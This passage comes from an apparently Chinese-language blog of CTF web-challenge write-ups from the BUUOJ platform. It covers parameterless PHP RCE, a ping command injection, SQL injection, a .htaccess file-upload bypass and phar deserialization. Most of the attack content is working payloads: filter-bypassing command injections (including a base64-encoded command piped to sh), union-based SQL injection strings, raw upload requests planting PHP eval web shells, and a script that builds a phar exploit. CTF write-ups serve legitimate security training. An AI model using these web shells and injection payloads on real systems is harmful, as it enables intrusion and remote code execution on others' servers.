class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第二个正则不大能看懂，于是百度一下得到考点：<strong>无参数rec</strong>  skysec师傅的<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">文章</a>介绍得很详细</p><blockquote><p>能执行a(b()),a()之类的函数，a(“1”),这样就不行。</p></blockquote><p>看完skysec师傅的文章后知道了第二个正则匹配的的意思</p><p> 第一个正则的意思payload是不能使用包含下列字符串的伪协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:&#x2F;&#x2F;,php:&#x2F;&#x2F;,phar:&#x2F;&#x2F;,filter:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>第三个也是payload不能包含下列字符串 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">et|na|info|dec|bin|hex|oct|pi|log</span><br></pre></td></tr></table></figure><p>使用session_id进行无参数rce，</p><p>过滤了et，不能使用file_get_contents,之类的函数，但是可以使用highlight_file、show_source</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp&#x3D;show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure><p>修改cookie中PHPSESSID=flag.php</p><p>访问即可拿到flag</p><h2 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h2><p>打开题目给出了<code>/?ip=</code>是命令注入 </p><p>过滤了空格，<code>$IFS</code>,<code>,</code>可以代替空格</p><p>反引号扩起来的表示取结果</p><p>paylaod:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;cat$IFS&#96;ls&#96;;</span><br></pre></td></tr></table></figure><p>看到了过滤源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your symbol!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/ /"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your space!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/bash/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your bash!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your flag!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>参考<a href="https://www.cnblogs.com/wangtanzhi/p/12246386.html" target="_blank" rel="noopener">王叹之师傅的博客</a>还可以可以进行变量赋值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sunny250@QAQdeMacBook ~ % b&#x3D;asd</span><br><span class="line">sunny250@QAQdeMacBook ~ % echo $b</span><br><span class="line">asd</span><br></pre></td></tr></table></figure><p>于是又得到另一种payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure><p>过滤了bash，还可以执行sh，通过编码绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure><p>绕过空格方式（参考来之颖奇师傅的<a href="https://www.gem-love.com/ctf/516" target="_blank" rel="noopener">博客</a>）</p><blockquote><p>$IFS</p><p>${IFS}</p><p>$IFS$9</p><p>&lt;</p><p>&lt;&gt;</p><p>{cat,flag.php} //用逗号实现了空格功能，需要用<code>{}</code>括起来</p><p>%20</p><p>%09 </p></blockquote><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>题目给了提示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span></span><br></pre></td></tr></table></figure><p>base32后base64解码得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &#39;$name&#39;</span><br></pre></td></tr></table></figure><p>给出了闭合方式</p><p>经过测试过滤了or，大写绕过。然后是常规sql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin&#39;union select 1,2,3#&amp;pw&#x3D;</span><br><span class="line">&#x2F;&#x2F;wrong pass!</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&#39;union select 1,&#39;admin&#39;,3#&amp;pw&#x3D;</span><br><span class="line">&#x2F;&#x2F;wrong pass!</span><br></pre></td></tr></table></figure><p>发现直接填写密码是错误的，尝试MD5，成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&#39;union select 1,&#39;admin&#39;,&#39;21232f297a57a5a743894a0e4a801fc3&#39;#&amp;pw&#x3D;admin</span><br><span class="line">&#x2F;&#x2F;flag&#123;db82a88f-343e-4c70-9761-a50345e1ef8c&#125;</span><br></pre></td></tr></table></figure><h2 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a>BabyUpload</h2><p>上传.haccess,1.ww。MIME : image/jpeg</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: eb3b2c5c-5ebe-4485-b09e-054c41fd176e.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------21225023787917569654236041647</span><br><span class="line"><span class="attribute">Content-Length</span>: 398</span><br><span class="line"><span class="attribute">Origin</span>: http://eb3b2c5c-5ebe-4485-b09e-054c41fd176e.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://eb3b2c5c-5ebe-4485-b09e-054c41fd176e.node3.buuoj.cn/</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=4c25aec0ff86fd39ba68c58584a387a8</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------21225023787917569654236041647</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="uploaded"; filename="1.ww"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line"><span class="attribute">GIF89a</span></span><br><span class="line">&lt;script language="php"&gt; </span><br><span class="line"><span class="attribute">eval($_POST[cmd]);</span></span><br><span class="line"><span class="attribute">&lt;/script&gt;</span></span><br><span class="line"><span class="attribute">-----------------------------21225023787917569654236041647</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------21225023787917569654236041647--</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: eb3b2c5c-5ebe-4485-b09e-054c41fd176e.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------4018079373823486313032354502</span><br><span class="line"><span class="attribute">Content-Length</span>: 444</span><br><span class="line"><span class="attribute">Origin</span>: http://eb3b2c5c-5ebe-4485-b09e-054c41fd176e.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://eb3b2c5c-5ebe-4485-b09e-054c41fd176e.node3.buuoj.cn/</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=4c25aec0ff86fd39ba68c58584a387a8</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------4018079373823486313032354502</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="uploaded"; filename=".htaccess"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">#define height 12</span><br><span class="line">#define width 12</span><br><span class="line">AddType application/x-httpd-php .ww</span><br><span class="line">php_value auto_append_file "1.ww"</span><br><span class="line">-----------------------------4018079373823486313032354502</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------4018079373823486313032354502--</span><br></pre></td></tr></table></figure><p>蚁剑连接即可</p><h2 id="BabysqliV3-0"><a href="#BabysqliV3-0" class="headerlink" title="BabysqliV3.0"></a>BabysqliV3.0</h2><p>admin，password弱密码直接登入</p><p>登入后看见连接，尝试为协议读取源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;upload.php</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; </span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">上传文件</span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;上传&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Uploader&#123;</span><br><span class="line">public $Filename;</span><br><span class="line">public $cmd;</span><br><span class="line">public $token;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function __construct()&#123;</span><br><span class="line">$sandbox &#x3D; getcwd().&quot;&#x2F;uploads&#x2F;&quot;.md5($_SESSION[&#39;user&#39;]).&quot;&#x2F;&quot;;</span><br><span class="line">$ext &#x3D; &quot;.txt&quot;;</span><br><span class="line">@mkdir($sandbox, 0777, true);</span><br><span class="line">if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;&#x2F;data:\&#x2F;\&#x2F; | filter:\&#x2F;\&#x2F; | php:\&#x2F;\&#x2F; | \.&#x2F;i&quot;, $_GET[&#39;name&#39;]))&#123;</span><br><span class="line">$this-&gt;Filename &#x3D; $_GET[&#39;name&#39;];</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$this-&gt;Filename &#x3D; $sandbox.$_SESSION[&#39;user&#39;].$ext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$this-&gt;cmd &#x3D; &quot;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#39;;&quot;;</span><br><span class="line">$this-&gt;token &#x3D; $_SESSION[&#39;user&#39;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function upload($file)&#123;</span><br><span class="line">global $sandbox;</span><br><span class="line">global $ext;</span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename))&#123;</span><br><span class="line">$this-&gt;cmd &#x3D; &quot;die(&#39;illegal filename!&#39;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">if($file[&#39;size&#39;] &gt; 1024)&#123;</span><br><span class="line">$this-&gt;cmd &#x3D; &quot;die(&#39;you are too big (′▽&#96;〃)&#39;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$this-&gt;cmd &#x3D; &quot;move_uploaded_file(&#39;&quot;.$file[&#39;tmp_name&#39;].&quot;&#39;, &#39;&quot; . $this-&gt;Filename . &quot;&#39;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function __toString()&#123;</span><br><span class="line">global $sandbox;</span><br><span class="line">global $ext;</span><br><span class="line">&#x2F;&#x2F; return $sandbox.$this-&gt;Filename.$ext;</span><br><span class="line">return $this-&gt;Filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function __destruct()&#123;</span><br><span class="line">if($this-&gt;token !&#x3D; $_SESSION[&#39;user&#39;])&#123;</span><br><span class="line">$this-&gt;cmd &#x3D; &quot;die(&#39;check token falied!&#39;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">eval($this-&gt;cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_FILES[&#39;file&#39;])) &#123;</span><br><span class="line">$uploader &#x3D; new Uploader();</span><br><span class="line">$uploader-&gt;upload($_FILES[&quot;file&quot;]);</span><br><span class="line">if(@file_get_contents($uploader))&#123;</span><br><span class="line">echo &quot;下面是你上传的文件：&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo file_get_contents($uploader);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在析构方法中看见了<code>eval</code>函数,还看见了<code>__toString</code>应该是序列化没错了，但是没看见unserialize，那就是phar序列化</p><p>寻找pop链接</p><blockquote><p>在最后的判断函数中，file_get_contents会触发<code>__toString</code>,filename可控，在<code>__destruct</code>中执行</p></blockquote><p>编写phar脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $Filename;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd=<span class="string">'show_source("flag.php");'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=<span class="string">'GXYfddf1387c1384a5dd61134d16247860b'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Filename=<span class="string">'test'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Uploader();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">'poc.phar'</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"poc.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($a); </span><br><span class="line">$phar-&gt;addFromString(<span class="string">"1"</span>, <span class="string">"0"</span>); </span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>在<code>__destruct</code>函数中,token要等于session</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != $_SESSION[<span class="string">'user'</span>])&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('check token falied!');"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>__construct</code>中给出了存在session的位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">$sandbox = getcwd().<span class="string">"/uploads/"</span>.md5($_SESSION[<span class="string">'user'</span>]).<span class="string">"/"</span>;</span><br><span class="line">$ext = <span class="string">".txt"</span>;</span><br><span class="line">@mkdir($sandbox, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> !preg_match(<span class="string">"/data:\/\/ | filter:\/\/ | php:\/\/ | \./i"</span>, $_GET[<span class="string">'name'</span>]))&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">'name'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">'user'</span>].$ext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">"echo '&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;';"</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token = $_SESSION[<span class="string">'user'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随意上传一下文件得到session</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">下面是你上传的文件：</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;e9791ad48bd0c6877a17604b0ad113bb&#x2F;GXYfddf1387c1384a5dd61134d16247860b.txt</span><br></pre></td></tr></table></figure><p>比如此处<strong>GXYfddf1387c1384a5dd61134d16247860b</strong>就是session</p><p>然后上传poc.phar文件，得到文件地址，再随意上传一个文件同时传入参数name</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">home.php?file&#x3D;upload&amp;name&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;e9791ad48bd0c6877a17604b0ad113bb&#x2F;GXYfddf1387c1384a5dd61134d16247860b.txt</span><br></pre></td></tr></table></figure><p>即可得到flag</p><p><strong>非预期</strong></p><p>看见P3师傅直接上传拿shell。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/home.php?file=upload&amp;name=shell.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 67c9597a-eae1-4272-a2bc-8b0d0444e98f.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:76.0) Gecko/20100101 Firefox/76.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------1489141389572370543625846861</span><br><span class="line"><span class="attribute">Content-Length</span>: 354</span><br><span class="line"><span class="attribute">Origin</span>: http://67c9597a-eae1-4272-a2bc-8b0d0444e98f.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://67c9597a-eae1-4272-a2bc-8b0d0444e98f.node3.buuoj.cn/home.php?file=upload&amp;name=phar:///var/www/html/uploads/e9791ad48bd0c6877a17604b0ad113bb/GXYfddf1387c1384a5dd61134d16247860b.txt</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=7b53797fc49085aab012e24a85e31c46</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------1489141389572370543625846861</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="test.php"</span><br><span class="line"><span class="attribute">Content-Type</span>: text/php</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line">-----------------------------1489141389572370543625846861</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------1489141389572370543625846861-</span><br></pre></td></tr></table></figure><p>蚁剑连接即可。</p><p><a href="https://www.gem-love.com/ctf/490.html" target="_blank" rel="noopener">颖奇师傅博客</a>还有一个非预期,直接随意上传文件把name参数改成flag.php。即可拿到flag</p><h2 id="StrongestMind"><a href="#StrongestMind" class="headerlink" title="StrongestMind"></a>StrongestMind</h2><p>直接写一个脚本自动提交即可<a href="https://www.cnblogs.com/h3zh1/p/12702655.html" target="_blank" rel="noopener">来自h3zh1师傅的脚本</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> url = <span class="string">"http://b4d1633d-5d1c-4b71-bedc-3545bea05581.node3.buuoj.cn/index.php"</span></span><br><span class="line">s = requests.session()</span><br><span 